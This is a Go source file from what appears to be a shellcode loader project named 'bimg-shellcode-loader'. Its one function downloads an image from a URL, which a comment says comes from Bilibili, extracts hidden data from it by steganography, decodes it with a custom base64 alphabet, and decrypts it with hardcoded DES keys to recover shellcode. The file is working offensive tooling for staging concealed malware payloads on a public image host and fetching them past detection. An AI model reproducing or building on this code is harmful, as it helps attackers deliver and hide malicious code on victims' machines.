package image

import (
	"bimg-shellcode-loader/crypt"
	"bytes"
	"fmt"
	"github.com/go-resty/resty/v2"
	"os"
)

// GetShellcode 从b站上下载图片，获取shellcode
func GetShellcode(url string) []byte {
	// 使用resty下载
	resp, err := resty.New().R().Get(url)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(0)
	}
	//获取返回值
	reader := bytes.NewReader(resp.Body())
	msg := crypt.StegDecode(reader)
	// 对msg进行base64解码
	shellcode, _ := crypt.CustomBase64Decode(string(msg))
	// 对shellcode进行des解密
	shellcode, _ = crypt.DesDecrypt(shellcode, []byte("12345678"), []byte("87654321"))
	return shellcode
}
